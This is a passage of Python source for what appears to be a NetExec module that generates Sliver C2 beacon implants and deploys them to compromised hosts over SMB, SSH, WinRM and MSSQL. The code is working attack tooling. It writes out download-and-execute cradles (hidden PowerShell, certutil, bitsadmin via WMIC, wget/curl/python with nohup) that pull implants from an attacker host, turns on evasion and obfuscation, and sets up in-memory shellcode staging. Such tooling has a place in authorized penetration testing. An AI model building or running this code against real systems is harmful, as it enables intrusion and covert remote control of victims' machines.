                context.log.fail(f"WAIT must be between 1-3600 seconds: {wait}")
                context.log.fail("")
                context.log.fail("Example: -o WAIT=120")
                raise ModuleValidationError("Invalid WAIT")

    def _parse_module_options(self, context, module_options):
        """
        Parse all module options and set instance variables.
        """
        self.implant_base_path = module_options.get("IMPLANT_BASE_PATH", "/tmp")
        if not os.path.exists(self.implant_base_path):
            context.log.warning(f"IMPLANT_BASE_PATH {self.implant_base_path} does not exist locally.")
        
        # Parse RHOST and RPORT (RPORT defaults to 443 if not specified)
        self.rhost = module_options.get("RHOST", None)
        if "RPORT" in module_options and module_options.get("RPORT") is not None:
            self.rport = int(module_options["RPORT"])
        else:
            self.rport = 443 if self.rhost else None
        
        cleanup_value = module_options.get("CLEANUP_MODE", "always")
        self.cleanup_mode = str(cleanup_value).lower()


        # Parse STAGING option
        staging_value = module_options.get("STAGING", "none")
        if staging_value.lower() == "download":
            # Download staging mode: implant downloaded via HTTP
            self.staging_mode = "download"
        elif staging_value.lower() == "shellcode":
            # Shellcode staging mode: bootstrap downloads shellcode via HTTP/TCP/HTTPS
            self.staging_mode = "shellcode"
        else:
            # None or "none": no staging
            self.staging_mode = None

        self.os_type = module_options.get("OS", None)
        self.arch = module_options.get("ARCH", None)
        self.share_config = module_options.get("SHARE", None)  # Optional, used by SMB
        self.wait_seconds = int(module_options.get("WAIT", "90"))

        # Parse beacon timing options (defaults: 5s interval, 3s jitter)
        self.beacon_interval = int(module_options.get("BEACON_INTERVAL", "5"))
        self.beacon_jitter = int(module_options.get("BEACON_JITTER", "3"))

        # PROFILE mode
        self.profile = module_options.get("PROFILE", None)
        if self.profile:
            context.log.display(f"Using Sliver profile: {self.profile}")

        # Parse staging options
        if self.staging_mode == "download":
            # Parse HTTP staging options
            http_staging_port_value = module_options.get("HTTP_STAGING_PORT")
            self.http_staging_port = int(http_staging_port_value) if http_staging_port_value is not None else 8080

            # Parse download tool
            download_tool_value = module_options.get("DOWNLOAD_TOOL")
            self.download_tool = download_tool_value.lower() if download_tool_value is not None else "powershell"

            # Display staging configuration
            context.log.display(f"HTTP download staging: {self.rhost}:{self.http_staging_port}")
            context.log.display(f"Download tool: {self.download_tool}")
            context.log.display(f"Final C2: {self.rhost}:{self.rport} (mTLS)")
        elif self.staging_mode == "shellcode":
            # Parse shellcode staging options
            self.shellcode_listener_host = module_options.get("SHELLCODE_LISTENER_HOST") or self.rhost
            shellcode_listener_port_value = module_options.get("SHELLCODE_LISTENER_PORT")
            self.shellcode_listener_port = int(shellcode_listener_port_value) if shellcode_listener_port_value is not None else self.rport

            # Parse shellcode protocol
            shellcode_protocol_value = module_options.get("SHELLCODE_PROTOCOL")
            self.shellcode_protocol = shellcode_protocol_value.lower() if shellcode_protocol_value is not None else "http"

            # Display staging configuration
            context.log.display(f"Shellcode staging: {self.shellcode_protocol.upper()} listener on {self.shellcode_listener_host}:{self.shellcode_listener_port}")
            context.log.display(f"Final C2: {self.rhost}:{self.rport} (mTLS)")

        
        fmt = module_options.get("FORMAT", "exe").lower()
        if fmt not in ["exe", "executable"]:
            context.log.fail("Only EXECUTABLE format supported. Use: exe")
            raise ModuleValidationError("Invalid FORMAT")
        self.format, self.extension = ("EXECUTABLE", "exe")

    def _load_sliver_config(self, context):
        """
        Load Sliver client config from [Sliver] section or default path.
        Exits if config file missing.
        """
        default_config = os.path.expanduser("~/.sliver-client/configs/default.cfg")
        
        if os.geteuid() == 0 and 'SUDO_USER' in os.environ:
            sudo_user = os.environ['SUDO_USER']
            import pwd
            try:
                user_home = pwd.getpwnam(sudo_user).pw_dir
                default_config = os.path.join(user_home, ".sliver-client/configs/default.cfg")
            except KeyError:
                pass
        
        self.config_path = context.conf.get(
            "Sliver", "config_path",
            fallback=default_config
        )
        if not os.path.exists(self.config_path):
            context.log.fail(f"Sliver config not found: {self.config_path}")
            raise ModuleExecutionError("Sliver config not found")

    def _fatal(self, context, msg):
        """Log fatal message and raise execution error (keeps existing behavior)."""
        context.log.fail(msg)
        raise ModuleExecutionError(msg)


    def _get_worker_and_connect(self):
        """Return shared GrpcWorker and ensure it's connected to current config."""
        worker = self.__class__._get_shared_worker()
        worker.submit_task('connect', self.config_path)
        return worker

    def _worker_submit(self, method, *args, **kwargs):
        """Convenience wrapper to ensure worker is connected then submit a task."""
        _ = self._get_worker_and_connect()
        worker = self.__class__._get_shared_worker()
        return worker.submit_task(method, *args, **kwargs)

    def _get_listener_by_id(self, listener_id):
        """Return listener proto object by ID or None."""
        _ = self._get_worker_and_connect()
        jobs = self._worker_submit('jobs')
        return next((j for j in jobs if getattr(j, 'ID', '') == listener_id), None)

    def _find_listener(self, protocol=None, port=None, name=None):
        """Find a listener by optional protocol, port and name.
        Returns the first matching listener proto or None.
        """
        jobs = self._worker_submit('jobs')

        def _match(j):
            if protocol and getattr(j, "Protocol", "").lower() != protocol.lower():
                return False
            if port is not None and getattr(j, "Port", 0) != int(port):
                return False
            if name is not None and getattr(j, "Name", "") != name:
                return False
            return True

        return next((j for j in jobs if _match(j)), None)

    def _build_c2_url_from_listener(self, listener_pb):
        """Build a C2 URL string from a listener protobuf-like object."""
        proto = getattr(listener_pb, 'Protocol', 'tcp').lower()
        host = getattr(listener_pb, 'Host', self.rhost)
        port = getattr(listener_pb, 'Port', self.rport)

        if proto == 'tcp':
            return f"mtls://{host}:{port}"
        elif proto == 'http':
            return f"http://{host}:{port}"
        elif proto == 'https':
            return f"https://{host}:{port}"
        else:
            raise ValueError(f"Unsupported listener protocol: {proto}")

    def _ensure_default_mtls_listener(self, context, mtls_port=None):
        """Ensure a default mTLS listener is available on port.
        Returns the listener object (proto) if found/created, else raises ValueError.
        """
        port = mtls_port or self.rport
        # First, check for an existing tcp listener with Name==mtls on the port
        existing = self._find_listener(protocol="tcp", port=port, name="mtls")
        if not existing:
            try:
                self._worker_submit('start_mtls_listener', self.rhost, port)
                context.log.info(f"Started default mTLS listener on {self.rhost}:{port}")
            except Exception as listener_e:
                if "address already in use" in str(listener_e).lower():
                    context.log.warning(f"mTLS port {port} in use (non-Sliver process?); assuming usable or pre-started.")
                else:
                    raise listener_e

        # Re-fetch after creation to get ID (expect an active mTLS listener)
        default_listener = self._find_listener(protocol="tcp", port=port, name="mtls")
        if not default_listener:
            raise ValueError("Failed to start default mTLS listener")
        return default_listener

    def get_handler(self, protocol):
        handlers = {
            "smb": SMBHandler(self),
            "ssh": SSHHandler(self),
            "winrm": WinRMHandler(self),
            "mssql": MSSQLHandler(self),
        }
        handler = handlers.get(protocol)
        if not handler:
            raise ValueError(f"Unsupported protocol: {protocol}")
        return handler

    def _get_exec_method(self, protocol):
        return {
            "smb": "smbexec",
            "ssh": "ssh",
            "winrm": "winrm",
            "mssql": "mssql"
        }[protocol]

    def on_login(self, context, connection):
        """
        Runs on all logins; handles priv checks and dedup.
        """
        protocol = connection.__class__.__name__.lower()
        high_priv_protocols = {"smb", "mssql"}

        if protocol in high_priv_protocols and not connection.admin_privs:
            if protocol == "mssql":
                context.log.warning("Low-priv MSSQL login; skipping (requires sysadmin). Try: -M mssql_priv -o ACTION=privesc")
            else:
                context.log.warning(f"Low-priv login on {protocol}; skipping (requires admin).")
            return

        try:
            self._run_beacon(context, connection)
        except ValueError as e:
            # Catch connection errors with helpful messages (e.g., proxychains localnet hint)
            context.log.fail(str(e))
        except Exception:
            # Unexpected errors should still be raised for debugging
            raise

    # Make module show as high privilege
    def on_admin_login(self, context, connection):
        pass

    def _run_beacon(self, context, connection):
        """
        Core beacon execution logic.
        1. Detect OS/arch
        2. Generate unique implant name
        3. Generate Sliver beacon or stager
        4. Upload to target via protocol handler (or skip for staging)
        5. Execute
        6. Wait & cleanup
        """
        if self.config_path is None:
            context.log.fail("Sliver config_path not set. Ensure options() is called before running the module.")
            raise ModuleExecutionError("Sliver config_path not set")


        host = connection.host
        os_type, arch = self._detect_os_arch(context, connection)
        implant_name = self._generate_implant_name()

        # Extract protocol from connection object's class name (e.g., 'winrm' -> 'winrm')
        protocol = connection.__class__.__name__.lower()
        handler = self.get_handler(protocol)

        # Auto-enable HTTP download staging for MSSQL (unless explicitly opted out)
        if protocol == "mssql" and self.staging_mode != "none":
            # Enable HTTP download staging as default for MSSQL
            self.staging_mode = "download"
            self.http_staging_port = self.http_staging_port or 8080

            # Default to certutil unless user specified a different download tool
            if not self.download_tool or self.download_tool == "powershell":
                self.download_tool = "certutil"

        # Auto-enable HTTP download staging for SMB Windows targets (unless explicitly opted out)
        if protocol == "smb" and os_type == "windows" and self.staging_mode != "none":
            self.staging_mode = "download"
            self.http_staging_port = self.http_staging_port or 8080
            # Default to PowerShell for SMB (most reliable on modern Windows)
            if not self.download_tool:
                self.download_tool = "powershell"


        try:
            full_remote_path = None
            listener_job_id = None
            website_name = None
            
            if self.staging_mode in ("download", "shellcode"):
                # Determine staging approach:
                # - If staging_mode == "download", use HTTP download staging
                # - If staging_mode == "shellcode", use TCP/HTTP shellcode injection staging
                if self.staging_mode == "download":
                    # HTTP download staging approach
                    context.log.display(f"Using HTTP download staging ({self.download_tool})")
                    full_remote_path, listener_job_id, website_name = self._run_beacon_staged_http(
                        context, connection, os_type, arch, implant_name, handler
                    )
                else:  # shellcode mode
                    # TCP/HTTP shellcode injection staging
                    if protocol != "winrm":
                        context.log.fail("Shellcode staging currently only supported on WinRM")
                        raise ModuleExecutionError("Shellcode staging only supported on WinRM")
                    self.stage_port = self.rport  # Define if needed
                    # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
                    _ = self._get_worker_and_connect()

                    # Build profile for stage2 (defines profile_name; already has connect guard)
                    _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)

                    # Gen bootstrap + prep stage2 (this also registers the stage)
                    self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)

                    # Now start stager listener with the profile name and stage data
                    self._worker_submit('start_stager_listener',
                                      self.shellcode_listener_host or self.rhost,
                                      self.shellcode_listener_port or self.rport,
                                      self.shellcode_protocol,
                                      profile_name,
                                      self.stager_data)
                    context.log.info(f"Started {self.shellcode_protocol.upper()} stager listener on {self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}")

                    # Now start mTLS listener for stage 2
                    self.mtls_port = self.rport  # Use RPORT for stage 2 mTLS
                    _ = self._get_worker_and_connect()  # Re-ensure for mTLS
                    self._worker_submit('start_mtls_listener', self.rhost, self.mtls_port)
                    context.log.info(f"Started mTLS C2 listener for stage 2 on {self.rhost}:{self.mtls_port}")

                    success = handler.stage_execute(context, connection, os_type, self.stager_data)
                    if not success:
                        context.log.fail("Stager execution failed")
                        raise ModuleExecutionError("Stager execution failed")
                    context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.shellcode_protocol.upper()})")
                    full_remote_path = None  # In-memory; no cleanup needed
            else:
                self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
                implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
                tmp_path = self._save_implant_to_temp(implant_data)
                self.local_implant_path = tmp_path
                full_remote_path, share = handler.get_remote_paths(os_type, implant_name)
                self.full_path = full_remote_path
                if share:
                    self.share = share
                context.log.display(f"Starting upload to {host} via {protocol}...")
                handler.upload(context, connection, tmp_path, full_remote_path)
                context.log.info(f"Uploaded to {host} via {protocol}")
                context.log.display(f"Executing beacon at {full_remote_path}...")
                handler.execute(context, connection, full_remote_path, os_type)

            self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, 
                                            cleanup_mode=self.cleanup_mode, 
                                            listener_job_id=listener_job_id, 
                                            website_name=website_name)

        finally:
            if self.staging_mode is None:
                self._cleanup_local_temp(self.local_implant_path)

    def _build_wmic_command(self, inner_cmd):
        """Wrap a command in WMIC for async fire-and-forget execution."""
        return f'WMIC process call create "cmd /c {inner_cmd}"'

    def _build_download_cradle(self, os_type, download_url, implant_name, protocol=None):
        """
        Build download cradle command for the specified OS and staging method.
        
        Args:
            os_type: Target OS (windows/linux)
            download_url: HTTP URL to download implant from
            implant_name: Name of the implant file
            protocol: Protocol being used (affects command format for SMB)
        
        Returns:
            str: Command to execute on target
        
        Raises:
            ValueError: If staging method not supported for OS
        """
        is_windows = os_type.lower() == "windows"
        
        if is_windows:
            # Windows staging methods
            if self.download_tool == "powershell":
                # PowerShell Invoke-WebRequest download + execute
                # SMB requires 'cmd /c' wrapper for PowerShell
                if protocol and protocol.lower() == "smb":
                    cmd = (
                        f'cmd /c powershell -ep bypass -w hidden -c '
                        f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
                        f'Start-Process $env:TEMP\\{implant_name}"'
                    )
                else:
                    cmd = (
                        f'powershell -ep bypass -w hidden -c '
                        f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
                        f'Start-Process $env:TEMP\\{implant_name}"'
                    )
            elif self.download_tool == "certutil":
                # Certutil download + execute with WMIC for true async
                cmd = self._build_wmic_command(
                    f'certutil -urlcache -f {download_url} '
                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                )
            elif self.download_tool == "bitsadmin":
                # BITSAdmin download + execute with WMIC for true async
                cmd = self._build_wmic_command(
                    f'bitsadmin /transfer job /download /priority high '
                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                )
            else:
                raise ValueError(f"Staging method '{self.download_tool}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
        else:
            # Linux staging methods
            tmp_path = f"/tmp/{implant_name}"
            
            if self.download_tool == "wget":
                # wget download + execute in background
                cmd = (
                    f'wget -q -O {tmp_path} {download_url} && '
                    f'chmod +x {tmp_path} && '
                    f'nohup {tmp_path} > /dev/null 2>&1 &'
                )
            elif self.download_tool == "curl":
                # curl download + execute in background
                cmd = (
                    f'curl -s -o {tmp_path} {download_url} && '
                    f'chmod +x {tmp_path} && '
                    f'nohup {tmp_path} > /dev/null 2>&1 &'
                )
            elif self.download_tool == "python":
                # Python urllib download + execute in background
                cmd = (
                    f'python3 -c "import urllib.request; '
                    f'urllib.request.urlretrieve(\'{download_url}\', \'{tmp_path}\')" && '
                    f'chmod +x {tmp_path} && '
                    f'nohup {tmp_path} > /dev/null 2>&1 &'
                )
            else:
                raise ValueError(f"Staging method '{self.download_tool}' not supported for Linux. Use: wget, curl, or python")
        
        return cmd

    def _execute_staged_command(self, context, connection, protocol, cmd, os_type, handler, download_url=None, implant_name=None):
        """
        Execute the download cradle command via the appropriate protocol.
        
        Args:
            context: NetExec context
            connection: NetExec connection
            protocol: Protocol name (winrm, mssql, smb, ssh)
            cmd: Command to execute
            os_type: Target OS type
            handler: ProtocolHandler instance
            download_url: Original download URL (for WinRM PowerShell)
            implant_name: Implant filename (for WinRM PowerShell)
        """
        host = connection.host
        
        if protocol == "winrm":
            # For WinRM, use ps_execute if it's a PowerShell command
            if self.download_tool == "powershell":
                # Execute the PowerShell portion directly
                inner_ps = f"IWR '{download_url}' -OutFile $env:TEMP\\{implant_name}; Start-Process $env:TEMP\\{implant_name}"
                result = connection.ps_execute(inner_ps, get_output=True)
                if result and result.strip():
                    context.log.debug(f"PowerShell output: {result}")
            else:
                # For certutil/bitsadmin, use regular execute
                connection.execute(cmd)
        elif protocol == "mssql":
            # MSSQL: Execute download cradle via xp_cmdshell
            
            # Reject Linux download tools (MSSQL targets Windows only)
            if self.download_tool in ["wget", "curl", "python"]:
                context.log.fail(f"Download tool '{self.download_tool}' not supported for MSSQL (Windows-only protocol)")
                raise ModuleValidationError("Invalid download tool for MSSQL")
             
            # Increase socket timeout for download operation (17MB implant can take 30+ seconds)
            # NetExec's execute() handles xp_cmdshell enable/disable automatically via MSSQLEXEC
            original_timeout = None
            try:
                if hasattr(connection.conn, 'socket') and connection.conn.socket:
                    original_timeout = connection.conn.socket.gettimeout()
                    connection.conn.socket.settimeout(120)  # 2 minutes for download
                    context.log.debug("Increased socket timeout to 120s for download operation")
                
                connection.execute(cmd)
                context.log.info("Download cradle executed via MSSQL (xp_cmdshell)")
            finally:
                # Restore original timeout
                if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
                    try:
                        connection.conn.socket.settimeout(original_timeout)
                    except (AttributeError, OSError):
                        pass  # Ignore errors restoring timeout
        elif protocol == "smb":
            # SMB: Execute download cradle via smbexec
            
            # Reject Linux download tools (SMB staging is Windows-only)
            if self.download_tool in ["wget", "curl", "python"]:
                context.log.fail(f"Download tool '{self.download_tool}' not supported for SMB staging (Windows-only)")
                context.log.fail("Use STAGING=none for Linux/Samba targets, or use powershell/certutil/bitsadmin")
                raise ModuleValidationError("Invalid download tool for SMB")
             
            # Check if target is Linux/Samba - staging not supported
            if os_type != "windows":
                context.log.fail("SMB HTTP staging only supported for Windows targets")
                context.log.fail("Use STAGING=none for Linux/Samba targets")
                raise ModuleValidationError("SMB staging requires Windows target")
            
            # Execute via smbexec
            connection.execute(cmd, methods=["smbexec"])
            context.log.info("Download cradle executed via SMB (smbexec)")
        else:
            # For other protocols, use handler's execute method
            handler.execute(context, connection, cmd, os_type)
        
        context.log.info(f"Download cradle executed on {host}")

    def _run_beacon_staged_http(self, context, connection, os_type, arch, implant_name, handler):
        """
        Execute beacon via HTTP download staging.
        
        This method:
        1. Generates a full implant EXE
        2. Creates a unique Sliver website and uploads the implant
        3. Starts an HTTP listener linked to the website
        4. Builds a small PowerShell download cradle (~200 bytes)
        5. Executes the download cradle on the target
        6. Waits for beacon check-in
        7. Optionally cleans up the website and listener
        
        Args:
            context: NetExec context object
            connection: NetExec connection object
            os_type: Target OS (windows/linux)
            arch: Target architecture (amd64/386)
            implant_name: Generated unique implant name
            handler: Protocol handler instance
        
        Returns:
            tuple: (full_remote_path, listener_job_id, website_name) for cleanup
        """
        host = connection.host
        protocol = connection.__class__.__name__.lower()
        
        # 1. Generate full implant EXE
        context.log.display("Generating implant for HTTP staging...")
        self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
        implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
        
        # 2. Create unique website and upload implant
        website_name = f"nxc_{secrets.token_hex(4)}"
        implant_path = f"/{implant_name}"
        
        context.log.display(f"Uploading implant to Sliver website '{website_name}'...")
        self._worker_submit('website_add_content', 
                           website_name, 
                           implant_path, 
                           "application/octet-stream", 
                           implant_data)
        context.log.info(f"Implant uploaded to website (path: {implant_path})")
        
        # 3. Start HTTP listener with website
        stager_host = self.rhost
        stager_port = self.http_staging_port

        context.log.display(f"Starting HTTP listener on {stager_host}:{stager_port}...")
        try:
            listener_resp = self._worker_submit('start_http_listener_with_website',
                                               stager_host,
                                               stager_port,
                                               website_name,
                                               secure=False)
        except Exception as e:
            error_msg = str(e)
            if "ALREADY_EXISTS" in error_msg or "in use" in error_msg:
                context.log.fail(f"Port {stager_port} is already in use by another listener.")
                context.log.fail("Solutions:")
                context.log.fail("  1. Use a different port: -o HTTP_STAGING_PORT=8081")
                context.log.fail("  2. In Sliver console, list active listeners with: jobs, kill existing listener: jobs -k <job_id>")
                raise ModuleExecutionError("Failed to generate implant")
            raise
        listener_job_id = listener_resp.JobID
        context.log.info(f"HTTP listener started (Job ID: {listener_job_id})")

        # 4. Build download cradle based on OS type and download tool
        download_url = f"http://{stager_host}:{stager_port}{implant_path}"
        
        # Build download cradle command based on OS and staging method
        try:
            cmd = self._build_download_cradle(os_type, download_url, implant_name, protocol)
            context.log.debug(f"Using {self.download_tool} staging method")
        except ValueError as e:
            context.log.fail(str(e))
            raise ModuleExecutionError("Failed to build download cradle")

        context.log.info(f"Payload size: {len(cmd)} bytes")
        
        # 5. Execute on target
        context.log.display(f"Executing download cradle on {host} via {protocol}...")
        self._execute_staged_command(context, connection, protocol, cmd, os_type, handler, download_url, implant_name)
        
        # Return cleanup info (will be handled by caller)
        return None, listener_job_id, website_name

    def _detect_os_arch(self, context, connection):
        """
        Detect target OS and architecture.
        Uses connection attributes or manual parsing.
        Falls back to user-specified OS/ARCH options.
        Exits on failure.
        """
        # Start with user-specified
        os_type = self.os_type
        arch = self.arch

        # If profile specified, log override but still detect for validation
        if self.profile:
            context.log.display(f"Profile '{self.profile}' overrides detected OS/arch for generation.")

        # Get OS info for both OS and arch detection
        os_info = getattr(connection, "server_os", None)

        # Detect OS if not specified
        if os_type is None:
            if not os_info:
                context.log.fail("Could not detect OS. Use -o OS=windows|linux")
                raise ModuleValidationError("Could not detect OS")

            os_info_lower = str(os_info).lower()
            # Assume "unix" and "samba" are equivalent to "linux"
            os_type = "windows" if "windows" in os_info_lower else "linux" if any(x in os_info_lower for x in ["linux", "unix", "samba"]) else None
            if os_type is None:
                context.log.fail(f"Unsupported OS: {os_info}")
                raise ModuleValidationError("Unsupported OS detected")

            context.log.debug(f"Detected OS: {os_type.title()}")

        # Detect arch if not specified
        if arch is None:
            arch_info = getattr(connection, "os_arch", None)
            if arch_info is None and os_info:  # Fallback to parsing server_os
                os_info_lower = str(os_info).lower()
                if any(x in os_info_lower for x in ["x64", "amd64", "64-bit"]):
                    arch_info = "amd64"
                elif any(x in os_info_lower for x in ["x86", "32-bit"]):
                    arch_info = "386"

            if not arch_info:
                arch = "amd64"  # Default to x64 when architecture cannot be detected
            else:
                arch_info_lower = str(arch_info).lower()
                if any(x in arch_info_lower for x in ("64", "x86_64", "amd64")):
                    arch = "amd64"
                elif any(x in arch_info_lower for x in ("x86", "32-bit", "i386", "i686")):
                    arch = "386"
                else:
                    arch = "amd64"  # Default to x64 for unknown architectures
            context.log.debug(f"Detected arch: {arch}")
        else:
            context.log.display(f"Using specified arch: {arch}")

        # Final validation
        if os_type not in ("windows", "linux"):
            context.log.fail(f"Invalid OS: {os_type}")
            raise ModuleValidationError("Invalid OS")
        if arch not in ("amd64", "386"):
            context.log.fail(f"Invalid ARCH: {arch}")
            raise ModuleValidationError("Invalid ARCH")


        context.log.info(f"Using: {os_type.title()} {arch}")
        return os_type, arch

    def _generate_implant_name(self):
        """
        Generate unique implant filename with random 8-char suffix.
        Format: implant_<random>.<extension>
        """
        random_suffix = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
        implant_name = f"implant_{random_suffix}.{self.extension}"
        return implant_name

    def _build_default_implant_config(self, os_type, arch, implant_name, c2_url):
        """
        Build ImplantConfig with configurable beacon interval and jitter.
        """
        _import_protobuf()
        ic = clientpb.ImplantConfig()
        ic.GOOS = os_type
        ic.GOARCH = arch
        ic.Format = clientpb.OutputFormat.Value(self.format)
        ic.IsBeacon = True
        ic.BeaconInterval = self.beacon_interval * 1_000_000_000  # Convert seconds to nanoseconds
        ic.BeaconJitter = self.beacon_jitter * 1_000_000_000   # Convert seconds to nanoseconds
        ic.Debug = False
        ic.ObfuscateSymbols = True
        ic.HTTPC2ConfigName = "default"  # Required for Sliver v1.6+
        if os_type == "windows":
            ic.Evasion = True

        c2 = ic.C2.add()
        c2.URL = c2_url
        c2.Priority = 0
        return ic

    def _build_ic_from_profile(self, context, os_type, arch, implant_name):
        """Validate and build ImplantConfig from an existing profile."""
        _ = self._get_worker_and_connect()
        profiles = self._worker_submit('implant_profiles')
        profile_pb = next((p for p in profiles if getattr(p, 'Name', None) == self.profile), None)
        if not profile_pb:
            context.log.fail(f"Profile '{self.profile}' not found.")
            raise ModuleValidationError("Profile not found")

        # Check if profile platform matches detected host OS/arch
        if profile_pb.Config.GOOS != os_type or profile_pb.Config.GOARCH != arch:
            context.log.fail("Profile incompatible with host")
            raise ModuleValidationError("Profile incompatible with host")


        _import_protobuf()
        ic_local = clientpb.ImplantConfig()
        ic_local.CopyFrom(profile_pb.Config)
        ic_local.GOOS = os_type
        ic_local.GOARCH = arch
        ic_local.Format = clientpb.OutputFormat.Value(self.format)

        context.log.info(f"Generating from profile {self.profile}")
        return ic_local, self.profile

    def _build_ic_default(self, context, os_type, arch, implant_name):
        """Build default ImplantConfig and attempt to reuse or save a profile."""
        _ = self._get_worker_and_connect()
        default_listener = self._ensure_default_mtls_listener(context, getattr(self, 'mtls_port', None))
        c2_url = self._build_c2_url_from_listener(default_listener)
        ic_local = self._build_default_implant_config(os_type, arch, implant_name, c2_url)
        profiles = self._worker_submit('implant_profiles')

        def _matches(p):
            try:
                has_c2 = bool(p.Config.C2)
                return (
                    p.Config.GOOS == os_type
                    and p.Config.GOARCH == arch
                    and p.Config.Format == ic_local.Format
                    and p.Config.ObfuscateSymbols == ic_local.ObfuscateSymbols
                    and p.Config.IsBeacon == ic_local.IsBeacon
                    and (p.Config.C2[0].URL == c2_url if has_c2 else False)
                )
            except Exception:
                return False

        matching_profile = next((p for p in profiles if _matches(p)), None)
        if matching_profile:
            context.log.info(f"Reusing matching default profile: {matching_profile.Name}")
            profile_name = matching_profile.Name
        else:
            _import_protobuf()
            profile_name = f"nxc_default_{secrets.token_hex(4)}"
            profile_pb = clientpb.ImplantProfile()
            profile_pb.Name = profile_name
            profile_pb.Config.CopyFrom(ic_local)
            try:
                saved_profile = self._worker_submit('save_implant_profile', profile_pb)
                context.log.info(f"Created default profile: {saved_profile.Name}")
                profile_name = saved_profile.Name
            except Exception as e:
                context.log.warning(f"Failed to save default profile '{profile_name}': {e}")

        return ic_local, profile_name

    def _get_listener_c2_url(self, listener):
        """
        Lookup listener by ID and build C2 URL.
        """
        listener_pb = self._get_listener_by_id(listener)
        if not listener_pb:
            raise ValueError(f"Listener ID {listener} not found")
        return self._build_c2_url_from_listener(listener_pb)

    def _generate_sliver_implant(self, context, os_type, arch, implant_name):
        """
        Connect to Sliver gRPC, use provided IDs or create default mTLS/profile, generate beacon implant.
        Returns raw implant bytes.
        Exits on failure.
        """
        try:
            # Ensure worker is connected
            _ = self._get_worker_and_connect()
            context.log.info("Connected to Sliver gRPC")

            if self.profile:
                ic, _ = self._build_ic_from_profile(context, os_type, arch, implant_name)
            else:
                ic, _ = self._build_ic_default(context, os_type, arch, implant_name)

            # Generate implant
            context.log.display(f"Generating Sliver {os_type}/{arch} {self.format.lower()}...")
            resp = self._worker_submit('generate_implant', ic, implant_name)
            context.log.info("Implant generated")
            context.log.debug(f"Implant generated is ({len(resp.File.Data)} bytes)")            
            return resp.File.Data
        except Exception as e:
            context.log.fail(f"Failed to generate implant: {e}")
            raise ModuleExecutionError("Failed to generate implant")

    def _generate_sliver_stager(self, context, os_type, arch, implant_name, profile_name):
        """Generate tiny bootstrap stager for fileless shellcode staging.
        
        This implements a two-stage shellcode delivery mechanism to bypass WinRM's
        150KB message size limit:
        
        Stage 1 (Bootstrap - ~2KB):
            - Tiny PowerShell script generated by this method
            - Downloads Stage 2 from Sliver stager listener via HTTP
            - Executes Stage 2 in-memory using VirtualAlloc + CreateThread
        
        Stage 2 (Full Shellcode - ~17MB):
            - Generated as Sliver shellcode implant with mTLS C2
            - Registered on Sliver's stager listener (HTTP/HTTPS/TCP)
            - Downloaded by Stage 1 bootstrap at runtime
        
        The bootstrap payload (~2KB) is 6,250x smaller than sending full shellcode
        directly, ensuring WinRM compatibility.
        
        Workflow:
            1. Generate full Stage 2 shellcode (~17MB) with mTLS C2 callback
            2. Save Stage 2 as Sliver profile/build for serving
            3. Register Stage 2 on Sliver's stager listener (makes it downloadable)
            4. Generate tiny PowerShell bootstrap that downloads from stager URL
            5. Return bootstrap bytes to caller for WinRM execution
        
        Args:
            context: NetExec context for logging
            os_type: Target OS ('windows' or 'linux')
            arch: Target architecture ('amd64' or '386')
            implant_name: Unique implant identifier
            profile_name: Sliver profile name (currently unused - may be removed)
        
        Returns:
            Raw bootstrap bytes (UTF-8 encoded PowerShell script)
            Caller must encode for PowerShell -EncodedCommand (UTF-16LE + base64)
        """
        try:
            _ = self._get_worker_and_connect()
            context.log.info("Generating tiny HTTP bootstrap stager...")
            
            # Build Stage 2 implant config with mTLS C2 callback
            ic_stage2 = self._build_default_implant_config(os_type, arch, implant_name, f"mtls://{self.rhost}:{self.rport}")
            _import_protobuf()
            ic_stage2.Format = clientpb.OutputFormat.SHELLCODE
            ic_stage2.Evasion = False  # Disable evasion for shellcode format
            ic_stage2.ObfuscateSymbols = False  # Disable obfuscation for faster generation
            
            # Generate full Stage 2 shellcode (~17MB) - too large for WinRM direct delivery
            stage2_resp = self._worker_submit('generate_shellcode', ic_stage2)
            if not stage2_resp.File or not stage2_resp.File.Data:
                raise ValueError("Stage 2 shellcode gen failed")
            context.log.debug(f"Stage 2 shellcode generated ({len(stage2_resp.File.Data)} bytes)")
 
            # Save Stage 2 as Sliver profile/build to make it serveable by stager listener
            stage2_profile_name = f"nxc_stage2_{secrets.token_hex(4)}"
            stage2_pb = clientpb.ImplantProfile()
            stage2_pb.Name = stage2_profile_name
            stage2_pb.Config.CopyFrom(ic_stage2)
            saved_stage2 = self._worker_submit('save_implant_profile', stage2_pb)
            build_id = saved_stage2.Name  # Profile name doubles as build ID
            context.log.debug(f"Stage 2 saved as profile/build: {build_id}")
 
            # Register Stage 2 on stager listener to make it downloadable
            # This tells Sliver: "When GET /<stage2_profile_name> is requested, serve this shellcode"
            stage_req = clientpb.ImplantStageReq()
            stage_req.Build.append(build_id)
            self._worker_submit('stage_implant_build', stage_req)
            context.log.debug("Stage 2 registered on listener")
            
            # Construct download URL for bootstrap based on shellcode protocol
            # Bootstrap will fetch Stage 2 from this URL at runtime
            if self.shellcode_protocol == "http":
                stage_url = f"http://{self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}/{stage2_profile_name}"
            elif self.shellcode_protocol == "https":
                stage_url = f"https://{self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}/{stage2_profile_name}"
            else:
